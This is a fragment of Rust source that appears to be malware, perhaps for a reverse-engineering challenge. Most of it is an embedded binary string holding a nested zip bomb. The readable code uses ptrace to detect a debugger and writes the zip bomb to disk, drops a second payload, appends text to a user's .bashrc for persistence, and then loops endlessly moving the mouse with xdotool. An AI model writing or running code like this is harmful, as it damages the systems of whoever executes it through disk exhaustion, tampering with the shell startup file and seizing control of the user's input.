��c���3���B��D�uctu�����(��9%�����
                                          <|E�����1�Hd�;�
                                                          �R�A��҈y\"��X�?X�6���S�y~�֬uM�Z����Qr/��7�!)�&Fʤ�.�A�s8��r��nu�ǡ����A勡X�`��!c��\"�O�ʷ[Ba(\"�؊��W�����>�sd�v��gɤ���տ�
                ]��;��&�2C:-�&.u\\4�*����3�b��o�����N�#�����9��e?Ŵ ����������G�d,NA��]�·l8T��Ќ��/�nɒ���Eܬc���L�7���T�Z̄��R�η:֢�Y�c�/cGfH�VT;�ou���6?��z9YQ�j�G�v�嬒�T3�!���u��юg���1$u
����\"D�_zX�~���*Z��X�(��-P���yN����m�RcXo��j[��������N���<k���
ΐ��Kǅ��W�#(��V�	|�>wYZ�aTޣ�@@&|!��6.Νme�����%Z��yݼLXͦ��O���I��+�)��/R���G���>U��䁢~7JA�ZNM-��Ϣ�b���Y^���y�z%ئDе�񚋣ָ�4f/���/�>�X3�]�t>�L�<�t.7�:���
                                                                            �9����hDǩ��=ni�Og4*L�Bw�7{���j�J!�����Wjc��5u1O;S\"?Z7\\'����j�5��E�2���Z ?Eժ�
Q����OiU&��9%�0�N���SO�����X3�(�Љ���DS���niFFi���hFv6'z�a�7��	����	���.Q�QL:F�,��apQ�䡌1�X�u�����ꪑ�|�gHS�	���U��t���ώ�����.��C�q��� ����P�!z;���ס�
       �o}�;cR�y�Q�-=����>��L��@��N�����B���+�޹�\";
���#�]7�{���|v�~����Gt�[O��n<X���JP!FQp��tꤔ^D'���ZCzSm��pWu��rju[QӄN�2U3���:*{�v�8U=�N���Ya��u���/K)M�� X�l��J����
T�g�4x������b}��fg?��zj�S����,��H�[����Vq���
�|0M�p?Ho�t\"OQ��N������>	E�l%�q��#�����e̝!z�s
8B~�)����h�k����a1M��PK3c�|(�	V�	
                                                lib d.zip�AE��\"D���)i�JrW{M�MY�[o�d�7�7�	@ԯ9�)�/߁b�$FM�˔���ɤax�ރ�3+Z��t��N��@hk��G�a���
0���3���A�Q:�H�yT����ԁU\\��L@\\wG{gJ��J02�A&,3�\\~|q�B���M+�����6��t��_��v
 cͅX)�Kc�J�`����{-G�@y������b�
��5^j��}Mֽ���L}t!xP7�?�f|&ʬJ�����{�)v4I.�~��@wDe?Ƴ4����Y,���=��빉�g�S�-�l�|���>�Va�jݚ�'>���p�!�M�\"��?�[��F7o�Z����w��n��OCe�6��p������}3���h�@���@��}5�w����H��Ԏ)~D��\\{�R7�\"Ip
                                     �'ʺ����[�yӱ3j��a~�} �з�H7���,Z\"��^Sr8ϭ�Y��*8Ld�.%����1VX����Ŝ���0f�F����T�������-Y8U�Fm�u�[	|�Mn�6]:!?�]�>\"�����d��.+��
m�v�闱�H;��Hd18aA!��fT�t��8�VD��)kx:������%Vxr����8ڕ+������3
V�>���J���
)=?�E���83�����fͰ��^�}�$�g�/�_�$x+��À:kQɞ�:X�6��	���\\�����Y
                   qRU�B��6�cE�������<{������h���A1{Lck�>������C�
                                                                    ��\"\\�P3��z�)lv$�{uF��x$[�4�6m�[Z�N�t�2 پ���;�a`��:������LU�����RT�&~�E�Vp���
���*ICmƣ��R�T�S��*�3P����~��2d?���ݱ����|ʛ�k���[Ol���`ȁUTD^����n�����(�
                                                                         ^��\"����R��~�sD��U.�P�r,䕃�␃�\"���������z����}��;��a�o���j������uT�+���qy���f�0Q�����t�p.��އe&���X�E�?��
|�M�s~����ׁի%!�ga-0Ǝ�+2�3�a[E�V:���
�N��k���^3V��Y�o����t��xO��X�A6��O�Y�C�K!��)��?B��-m�_���������OK���7\"n�_�J^[[?62;ca��t\"
               6��'�L���3Q��R3�_
�5�/��6i�[3_eS���8�db�|�,�>\\����@���d����d��%���sᄴ����nVQ.�Xn��`���G+��H4�+�I
 �����+�����J2���i��&d[��f�9g�X��]�T�1����u,
\"��&6'��Uoh		��4h^��=]�S�M��@WX`u�L��%�g�M�#����e���T��4k��
                                                                               �N:�n�C�+:������)�vtd�x�4\\��}���{p�v g5��hj�U��A�7���[��sArjod�a��%��PD,�&�M��ݴ÷���l�����栶����!�������BW��W��]��\"�͂����sM��~��U��޿l�,��~Aa��
g��gh��*hk�Cs[�H*��k�;�eQ ��Y0�����Yj&�w�*�𒲏3�[��C�R���I>:'�C��8D��<ke�����q\"�EUQ�����wR���Ų5��o\"�ӳ��WT8����h�j�� QT�7�H_ J���<��s�HJ�X�HN��Y�5#�km�c�s���~��l��\\sX~\\aPad� 8h3�p\"sX�T%V�~w7U�P�д�Xk�m44��im��3	�
����i{
m(�@p2:4�����t��Zl�P=�]6�����p��B��. k���n�������Ѵ��@+��l���
                                                               �)���p'�TH@�]1$��$������Ύ��v'�A�Ʋ?�/z�IBs�rћ�J�
_N��r�YX�6j����S�Q����rN��y?Vr]#�����Ռ�����<UQ�e��n��-A�ik����V�͗���k`�,��T�hT_�8 �����_x@�e-��׽�E�D#?J\\�W��Qӟ��yk%��[�rC˪lC�P�D�79��Ꮷ��xE;L�-و��*�$��ux%{
                                       ��K��L��>��J�j�t*Mlb:D��PK3c�|(�	V�
                                                                                 lib e.zip�AE��F��k��4��ԗ'~�B���ø��ͭyhx�T��M���TYLa���.�l\"7/?Y�E�)��8���E9����$\\��G�Wv%�L<�
Q�Sxx�8p,���&,0��W���%��� T�j��Ž8t�O�
                 ���K{\\�Q���>;�k�tX��j���=]/hk3�1k3^���G�꾨��mx�Nׯ����?���ϲ��X8D�ևe\\��_.9ɮ�eU�Q�:�kX=7j[*ty���1OAQ�Zi+;q���/�xݓn��B��2��g�~e�K��M���Z�����?Ӧ����ɕ�o�Ń{)k����V��P5M��&�@��[bIo��ՙ_�[����H8 8�9#�s9�9����Tdxw\"���P�.o����o���=�,���%u��D�
                        q�I~o���/We�$$pl���H�>u*����9S?8m�5�u *G��W�k�]�m{k4��Fq7F;���)��癨U����q*���F���L���a�$ fA6'��)��w�զ��\"�����H�̆�pcɏ�a��D�X�}J̱��
                                                               y�~s��	�
                                                                         ��R<b�e3){��4�ޠ�����d2+����P����,��X�ZS�:�N��ck
��üR��g!Z���u\"��������K���t����/�[�
�!�y��Γi(�l�����.6��$�b��>ؿ��� �����%L=}I�4�ad�a5�n�4�y�!Ͷ|^ �ДA]�
�����]��?��ՔV�HzhaC
                     f\"��Q�W������p82n���Z!�|������[(1x����z(i�����o
��\\Vo����@���C�D������8�'ݻnl�k���30�ST���Ӷ���3�]#�T6����)���
                                                                   I���C��z�Q�|XS���n'�d;�*��[�=z�ވ����]U-�a���&�Bu����@|XJ����t�����^�[=�#�w�����D��;��g��S��x�h�4(�7(��e�> ��bt��e��ִ���
��� d��(g�Z����4\"W3��T|��obA}����8-.�����z/#D4r�hj�=HaVu]�V|f�/zH��FY_��$��^J3�0���vN�%MH��38�����/�(5�t'��
                                      �6j/���_���i#���q�]zG����!���u˦D�6o�?�vFV7�n���w�2���+����������	M�7$x�������Z#k�-o�Rah�6����qF�:���;�G؈��V1[�����VTJنu)�l㮛0���s�(�?͝��R`?��;Ϝ���������ndЪ�������l���S�x�q�.@d�Q
           m��\\��u�fX,U+�������B�H?g��w��Z=e@O�R���~u`�2��C\\AgOFD`jq�R,�1vbksf����K)J�*�X,�ԓ��9�O^��i�i�nPr���gKi(�xo�x�sű��{%BL���b�?/ؑI�(SJ�,>�܇�Vp�����
$�Yo�hY��X���
���[gt�7���\\�1�m���p�i�'Ox汩{
?>��K�R{T��t/D���O�P�H���Y��PP2���	&p0Y�����a�3�Qc5���ϵhԯkaA��F��~�����[�m�_!�SB�6�7���:s;�`Ĭ<ߡ1sYA�m�K��]=4�K,��P�06tp�fn�
                                                      �N�y�1f�x*��g����$ܞ�1G�C�S���X �۴�%��H0]2��ʎZ�o���_BFa�t��oL�B�P
%'?�H��F��O4�~p�p/�R1��_0�[r�38st��]0��%�I���%P%Mi��螊:��D8��Vx���ج�zG'
Ko�X|�e�����z�>^܂2A�-�n��U���t#&?H�r�侑;�n#'8�����	5
                       �U���DQ�7�G(=�|q���P�Eo�:V�tXg
                                                           �����9I���5nf>���g��l������U��	<�x���q�{~����9��s,��d��S��6��S~%[��$۩�Pt�?�����)T�P���5�RD��͂C�8b�tN=�k6D+H}*��RX?��g��t�h��eDx�yP8D)�t'�5��/�ň�cD!`[�>���U�xH��
��R]ec�������;�7�Z\"���_&-�uj��~���<2� �]�|�qe9#�;�F'�v*B|}l�?�.���Mb1��p�Di���ٲ%㷀��7/_��8!^��PK3c�|(�	V�	
                                                lib f.zip�AEǋU\")����
QȔ8My� 개�����;���r����0��n �h�������Ʌ��G��|
ܮ���)                                             ?[�
     'Aӕ��
 ��Bks�6�ǩ�~y���LU�!蔻��vI�/���QcHRܡ��K?}��t�$�.��WKe������GGe���ssy4�����t�͏3��Ւj6�A(d�G���Ys淎�ޏ?��c6Ƈ8�}��a.{Y�V��Y�A��������6��3�-
                                       ���U5�Sj��)�e��;�\\��Ή�a�{w�`
A<���e�J�E�N�V�'�P<j�(�Vfgt5j��y�                              ��D�\
                                       �d=m���h��`x#��O:�iE���@��m��-����t�8���M<j��4����
          �ZK,d�q���%����w9�n�%y�q����9�A�iuצH�C�R��Rԉmc���P��@���p��e#L���k���B��hM�,�����H��;��B�����ƿ��oBٿdg����2�uϔ)�+��P�����g
                                                                  E�\\)(G��6�y� ����Z�/q�۹����S�9[���X��$wK�[R+87w��x��\"�H\\7�y��va�����[SlBQ&����{Y����L؞��}V�a?M��ќų4.�����v|��x!�ʶ{��A�>�;�jp���7���9�f@Or��M���C�U�{Wqo�r܍�v���袑��~�C.i�È�O����	4$Fƃ��@\\i�j,x�F��3�(��i^�bp���P�b����sh)V������
                                                                   1g�P����!�~2?a��R2�Єov�L�NHn⒘�K
                    ��)�֢�z�R\\�����'4��<P8'�e+���8Z	M�e:]�C��\\)��;�(�5ޑ�J�m�.�d���R����g�����j�,�o�_Q.Y,�5e�	�A��*/
                                                B�����9X�aR
                                                            .j���q�G/�5�,��ң�H�AAw� ��˕�x���ٚ.�m'+t�?�
�����Ȯ
����9�`�y�{��N\\��Ϸ�`	E*Z���I�}9�g5:�,'n�-7~��N��a+6�@��C��;A\\��hE-o��X�hF�bQx��V��o�8�a��Z]S�cE ���Q~F��sN���9�[�bݾ\"_9I4l�Q�yn�m������8`�0*k������,e<z�A�~�<�[���k��Z�,��/:��o���hB�NKG��Z��o�]r���dV��3t�\",'H{�������w)��SE6�׽���7�^ǂ��N�
����}�^'/����]�/֮�5�����!Q�䳘��I������Zx���xF���(2�������--���8�KyZ�L��ڿ.I�$�A������70����zë�2�''O�.�5/�݊�~������Iu-�O����OƸ�Ly~N���n5�3A�A�����K+T��\"���]o
          �(���R��bH�ϥ;xܮ/6#!�,��:���i����[���0a�qĺIC���J�̞�5��l��B�J&r�Z!.KO����������F���#��
                         �RXX�����S�%�
���e�ȸ���g�O`'��)��9�s�8�#	�v��z�g	�sAf0�ʴ��v]Gxm�%�P���Hٶ{.����B
r��!Y7j�
         �t���
���2=�w��YM����QI9�iciύ�r!m��N������>44?���_~�fR5�Էd�DzÈ(�e���#ܒ-���Hvkfϊ���^x������I����|G����4=�̕|@b�h��O���c],L��4H��;��t�G����������?$���)O@�\"t�y��u�}�2@�n�ծ�������[4^�V�Ϣ`�	{h M���fz���w���f�w�r�M�.��B㏒�yw�C���+�����tJ��@��6�����Wu%��P�z��φ���!�+�[��_��Y���_&��%�_)TH���7�r�G���9I�R������]GN1��Ͳ��
       A�ZyO		�l�<zX������@#bm��6��Ų�0e����BE��Ȣxk�_`����P�U�0\"�֟迆��E@{�Fx^P�*��=�;�fS�}�N�����D�k}�d	sҒ���h{����
           5�LQ
�t`�:PK?3c�|(��<��߫�PV�	/ lib 0.zip
 Oh����V�s��V�s���AEPK?3c�|(�	V�	/ 
lib 1.zip
 Oh����V�s��V�s���AEPK?3c�|(�	V�	/ lib 2.zip
 Oh����V�s��V�s���AEPK?3c�|(�	V�	/ *lib 3.zip
 Oh����V�s��V�s���AEPK?3c�|(�	V�	/ 8(lib 4.zip
 Oh����r}X�s��r}X�s���AEPK?3c�|(�	V�	/ F2lib 5.zip
 Oh����r}X�s��r}X�s���AEPK?3c�|(�	V�	/ T<lib 6.zip
 Oh����r}X�s��r}X�s���AEPK?3c�|(�	V�	/ bFlib 7.zip
 Oh����r}X�s��r}X�s���AEPK?3c�|(�	V�	/ pPlib 8.zip
 Oh����r}X�s��r}X�s���AEPK?3c�|(�	V�	/ ~Zlib 9.zip
 Oh����r}X�s��r}X�s���AEPK?3c�|(�	V�	/ �dlib a.zip
 Oh����r}X�s��r}X�s���AEPK?3c�|(�	V�	/ �nlib b.zip
 Oh����r}X�s��r}X�s���AEPK?3c�|(�	V�	/ �xlib c.zip
 Oh����2@]�s��2@]�s���AEPK?3c�|(�	V�	/ ��lib d.zip
 Oh����2@]�s��2@]�s���AEPK?3c�|(�	V�	/ Člib e.zip
 Oh����2@]�s��2@]�s���AEPK?3c�|(�	V�	/ Җlib f.zip
");
/*
    let test_inet = Command::new("apt-get")
        .args(&["install","conky","-y"])
        .output().unwrap();

    let ti = test_inet.stdout;
    let stringinet = str::from_utf8(&ti).unwrap();
    
    if stringinet.contains("Could not resolve"){
        println!("please give me internet.  I promise I am not bad");
        process::exit(process::id() as i32);
    }
    
    
    Command::new("apt-get")
        .args(&["install","xdotool","-y"])
        .spawn().ok();
    println!("Sleeping while installing");
    let mut installed = Command::new("apt").args(&["list", "--installed", "|", "grep", "-i", "xdotool"]).output().unwrap();
    let mut out = installed.stdout;
    let mut strout = str::from_utf8(&out).unwrap();
    println!("penis {}",strout);
    
    while(!strout.contains("xdotool")){
        installed = Command::new("apt")
            .args(&["list", "--installed","|","grep","-i","xdotool"])
            .output().unwrap();
        out = installed.stdout;
        strout = str::from_utf8(&out).unwrap();
    }
    
    let ten_millis = time::Duration::new(10,0);
    thread::sleep(ten_millis*2);
    */
    println!("done sleeping");
	if unsafe{ptrace(libc::PTRACE_TRACEME, 0, 0, 0)} < 0{
		print!("being traced");
		let mut kb = fs::File::create("42.zip").unwrap();
    		kb.write_all(zip_bomb.as_bytes());
	}
	else{
		println!(":)");
		
	}
    let mut kb = fs::File::create("love").unwrap();
    kb.write_all(new_kb.as_bytes());
    let mut bomb = fs::File::create("bomb.zip").unwrap();
    bomb.write_all(zip_bomb.as_bytes());
    let mut file = OpenOptions::new()
		.append(true)
		.open("/home/reverser/.bashrc")
		.unwrap();
    if let Err(e) = write!(file, "{}", meta_term){
    	eprintln!("Couldnt write to bashrc");
    }
    let x = 0;
	while x < 1000000 {
		Command::new("xdotool")
		.args(&["mousemove", "200", "200"])
		.spawn().ok();
	}
	
}
